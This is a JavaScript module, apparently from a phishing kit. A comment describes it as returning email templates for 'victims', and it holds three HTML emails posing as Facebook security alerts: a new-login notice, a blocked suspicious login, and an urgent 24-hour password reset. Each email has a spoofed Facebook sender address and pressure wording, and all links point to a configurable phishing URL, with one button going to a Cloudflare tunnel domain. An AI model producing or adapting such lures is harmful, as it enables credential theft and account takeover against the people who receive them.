// The logic here handle time and all parameters rtequired byb the mail
/*
function that accepts victim's users name, email, and template ruquired and returns the template pages
 to be used by the 'send_mail' logic
*/

import dotenv from "dotenv"
dotenv.config()

const URL = process.env.PHISHING_URL || "192.168.1.0"

function getFormattedDateTime() {
    const now = new Date();

    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');

    let hours = now.getHours();
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');

    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12 || 12; // convert 0 => 12

    const formattedTime = `${hours.toString().padStart(2, '0')}:${minutes}:${seconds} ${ampm}`;
    const formattedDate = `${year}-${month}-${day}`;

    return `${formattedDate} ${formattedTime}`;
}


export default async function fetch_template(type = 2, username = null, target_email) {

    const mailOptions = [

        {
            type: "New_login_alert",
            subject: "Security Alert: New Login to Your Facebook Account",
            from: "\"Facebook Security\" <security@facebookmail.com>",
            replyto: "no-reply@facebook.com",
            prority: "High",
            html: `
        <!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Security</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #1c1e21; background-color: #f0f2f5; margin: 0; padding: 20px; }
        .container { max-width: 680px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .header { background: #1877f2; padding: 20px; text-align: center; }
        .header img { height: 40px; }
        .content { padding: 40px; }
        .alert-box { background: #fff8e1; border-left: 4px solid #ffb300; padding: 16px; margin: 20px 0; border-radius: 0 4px 4px 0; }
        .login-details { background: #f5f6f7; border: 1px solid #dddfe2; border-radius: 6px; padding: 20px; margin: 20px 0; }
        .detail-item { display: flex; margin-bottom: 12px; }
        .detail-label { font-weight: 600; min-width: 120px; color: #65676b; }
        .button { display: inline-block; background: #1877f2; color: white; text-decoration: none; padding: 12px 24px; border-radius: 6px; font-weight: 600; margin: 10px 5px; }
        .button-secondary { background: #e4e6eb; color: #050505; }
        .footer { padding: 20px; text-align: center; color: #65676b; font-size: 13px; border-top: 1px solid #dddfe2; background: #f5f6f7; }
        .device-icon { width: 16px; height: 16px; margin-right: 8px; vertical-align: middle; }
        .location-icon { color: #1877f2; margin-right: 6px; }
        .timestamp { color: #65676b; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <!-- Facebook logo in blue background -->
            <img src="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.woff2" alt="Facebook" onerror="this.style.display='none';">
            <div style="color: white; font-size: 20px; font-weight: 600; margin-top: 10px;">Security</div>
        </div>
        
        <div class="content">
            <h2 style="margin-top: 0;">Hi ${username},</h2>
            
            <p>We noticed a new login to your Facebook account from a device we don't recognize.</p>
            
            <div class="alert-box">
                <strong>Was this you?</strong><br>
                If this was you, you can safely ignore this email. If this wasn't you, we recommend securing your account.
            </div>
            
            <div class="login-details">
                <h3 style="margin-top: 0; color: #1c1e21;">Login Details</h3>
                
                <div class="detail-item">
                    <span class="detail-label">📱 Device:</span>
                    <span>Chrome on Windows 11</span>
                </div>
                
                <div class="detail-item">
                    <span class="detail-label">📍 Location:</span>
                    <span>
                        <span class="location-icon">📍</span>
                        Denver, Colorado, United States<br>
                        <span style="font-size: 13px; color: #65676b;">(Approximate location based on IP: 104.28.152.[REDACTED])</span>
                    </span>
                </div>
                
                <div class="detail-item">
                    <span class="detail-label">🕐 Time:</span>
                    <span> ${getFormattedDateTime()} (UTC-7)</span>
                </div>
                
                <div class="detail-item">
                    <span class="detail-label">🌐 Browser:</span>
                    <span>Chrome 121.0.6167.160</span>
                </div>
            </div>
            
            <p><strong>If this wasn't you:</strong></p>
            <ul>
                <li>Your password may have been compromised</li>
                <li>Someone else might be accessing your account</li>
                <li>We recommend reviewing your account activity immediately</li>
            </ul>
            
            <div style="text-align: center; margin: 30px 0;">
                <a href="${URL}" class="button">Review Login Activity</a>
                <a href="https://finest-immigration-ones-legs.trycloudflare.com" class="button button-secondary">Secure Account</a>
            </div>
            
            <p style="font-size: 14px; color: #65676b;">
                <strong>Note:</strong> For your security, this email was sent to all email addresses associated with your Facebook account.
            </p>
            
            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #dddfe2; font-size: 14px; color: #65676b;">
                <strong>Why are you receiving this email?</strong><br>
                Facebook sends login alerts when we detect a login from a new device or browser. This helps keep your account secure.
            </div>
        </div>
        
        <div class="footer">
            <p>
                This message was sent to ${target_email}.<br>
                <a href="${URL}" style="color: #1877f2; text-decoration: none;">Help Center</a> • 
                <a href="${URL}" style="color: #1877f2; text-decoration: none;">Privacy Policy</a> • 
                <a href="${URL}" style="color: #1877f2; text-decoration: none;">Unsubscribe</a>
            </p>
            <p style="font-size: 12px; color: #8a8d91;">
                © 2024 Facebook, Inc., 1 Hacker Way, Menlo Park, CA 94025
            </p>
        </div>
    </div>
</body>
</html>`
        },
        {
            type: "Suspicious_login_alert",
            subject: "ACTION REQUIRED: Suspicious Login Attempt Blocked",
            from: "\"Facebook Security\" <security@facebookmail.com>",
            replyto: "no-reply@facebook.com",
            prority: "High",
            html: `
<!DOCTYPE html>
<html>
<body style="font-family: Helvetica, Arial, sans-serif; line-height: 1.6; color: #1c1e21; max-width: 600px; margin: 0 auto;">

<table width="100%" cellpadding="0" cellspacing="0" style="background-color: #f0f2f5;">
    <tr>
        <td align="center" style="padding: 40px 20px;">
            <table width="100%" cellpadding="0" cellspacing="0" style="max-width: 520px; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                
                <!-- Header -->
                <tr>
                    <td style="background: #1877f2; padding: 30px; text-align: center;">
                        <span style="color: white; font-size: 28px; font-weight: bold;">facebook</span>
                        <div style="color: white; font-size: 18px; margin-top: 10px;">Security Center</div>
                    </td>
                </tr>
                
                <!-- Alert Banner -->
                <tr>
                    <td style="background: #d93025; color: white; padding: 15px 30px; text-align: center; font-weight: bold;">
                        ⚠️ SUSPICIOUS LOGIN ATTEMPT BLOCKED
                    </td>
                </tr>
                
                <!-- Content -->
                <tr>
                    <td style="padding: 30px;">
                        <p>Hi ${username},</p>
                        
                        <p>We blocked an attempt to log into your Facebook account because we noticed some unusual activity.</p>
                        
                        <div style="background: #f5f6f7; border-radius: 6px; padding: 20px; margin: 25px 0;">
                            <h3 style="margin-top: 0; color: #d93025;">⚠️ Unusual Activity Detected</h3>
                            <p><strong>Attempted Login From:</strong><br>
                            • Location: Moscow, Russia<br>
                            • Device: Unknown Android Device<br>
                            • Time: ${getFormattedDateTime()}<br>
                            • IP Address: 95.213.255.41</p>
                        </div>
                        
                        <p>This attempt was blocked for your protection. However, we recommend taking immediate action to secure your account.</p>
                        
                        <div style="border-left: 4px solid #1877f2; padding-left: 15px; margin: 25px 0;">
                            <p><strong>Recommended Actions:</strong></p>
                            <ol>
                                <li>Review recent account activity</li>
                                <li>Change your password immediately</li>
                                <li>Enable two-factor authentication</li>
                                <li>Check connected apps and websites</li>
                            </ol>
                        </div>
                        
                        <div style="text-align: center; margin: 35px 0;">
                            <a href="${URL}" 
                               style="background: #1877f2; color: white; text-decoration: none; padding: 14px 28px; border-radius: 6px; font-weight: bold; display: inline-block;">
                                Review Account Activity Now
                            </a>
                        </div>
                        
                        <p><strong>If this was you:</strong><br>
                        Please verify your identity to regain access to your account.</p>
                        
                        <div style="font-size: 14px; color: #65676b; padding: 15px; background: #f8f9fa; border-radius: 6px; margin-top: 30px;">
                            <strong>Need help?</strong><br>
                            Visit our <a href="${URL}" style="color: #1877f2;">Help Center</a> or 
                            <a href="${URL}" style="color: #1877f2;">contact support</a>.
                        </div>
                    </td>
                </tr>
                
                <!-- Footer -->
                <tr>
                    <td style="padding: 20px 30px; background: #f5f6f7; border-top: 1px solid #dddfe2; font-size: 13px; color: #65676b;">
                        <p>This email was sent to ${target_email} because we detected unusual activity on your Facebook account.</p>
                        
                        <p style="margin-top: 20px;">
                            <a href="${URL}" style="color: #1877f2; text-decoration: none;">Data Policy</a> • 
                            <a href="${URL}" style="color: #1877f2; text-decoration: none;">Terms</a> • 
                            <a href="${URL}" style="color: #1877f2; text-decoration: none;">Unsubscribe</a>
                        </p>
                        
                        <p style="font-size: 12px; margin-top: 20px;">
                            Facebook, Inc., Attention: Community Support, 1 Facebook Way, Menlo Park, CA 94025
                        </p>
                    </td>
                </tr>
                
            </table>
        </td>
    </tr>
</table>

</body>
</html>
`
        },
        {
            type: "password_reset_alert",
            subject: " Urgent: Password Reset Required for Your Facebook Account",
            from: "\"Facebook Security\" <security@facebookmail.com>",
            replyto: "no-reply@facebook.com",
            prority: "High",
            html: `
<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
    <div style="background: #4267B2; padding: 20px; text-align: center;">
        <span style="color: white; font-size: 32px; font-weight: bold;">facebook</span>
    </div>
    
    <div style="padding: 30px; background: white; border: 1px solid #dddfe2;">
        <h2 style="color: #1d2129;">Account Security Update Required</h2>
        
        <p>Hello,</p>
        
        <p>As part of our ongoing security improvements, we've identified that your Facebook account password may have been exposed in a recent data incident.</p>
        
        <div style="background: #f0f8ff; border: 1px solid #c8dfff; padding: 15px; margin: 20px 0; border-radius: 5px;">
            <p style="margin: 0;"><strong>⚠️ Required Action:</strong> You must reset your password within 24 hours to maintain access to your account.</p>
        </div>
        
        <p><strong>Why is this necessary?</strong><br>
        Our security systems have detected that your current password may be compromised. To protect your account and personal information, we require you to update your password.</p>
        
        <div style="text-align: center; margin: 30px 0;">
            <a href="${URL}"
               style="background: #4267B2; color: white; text-decoration: none; padding: 15px 40px; border-radius: 6px; font-size: 16px; font-weight: bold; display: inline-block;">
                Reset Your Password Now
            </a>
        </div>
        
        <p><strong>What happens if you don't reset your password?</strong><br>
        After 24 hours, your account will be temporarily restricted until you complete the password reset process.</p>
        
        <div style="border-top: 1px solid #eee; padding-top: 20px; margin-top: 30px; font-size: 14px; color: #666;">
            <p><strong>Need help?</strong><br>
            Visit our <a href="${URL}" style="color: #385898;">Help Center</a> for more information about account security.</p>
            
            <p>This is an automated security message from Facebook. Please do not reply to this email.</p>
        </div>
    </div>
    
    <div style="background: #f5f6f7; padding: 20px; text-align: center; font-size: 12px; color: #8a8d91; border-top: 1px solid #dddfe2;">
        <p>Facebook, Inc., 1 Hacker Way, Menlo Park, CA 94025</p>
        <p>
            <a href="${URL}" style="color: #8a8d91; text-decoration: none;">About</a> • 
            <a href="${URL}" style="color: #8a8d91; text-decoration: none;">Privacy</a> • 
            <a href="${URL}" style="color: #8a8d91; text-decoration: none;">Terms</a> • 
            <a href="${URL}" style="color: #8a8d91; text-decoration: none;">Ad Choices</a>
        </p>
    </div>
</div>`
        }
    ]

    return mailOptions[type - 1];
}
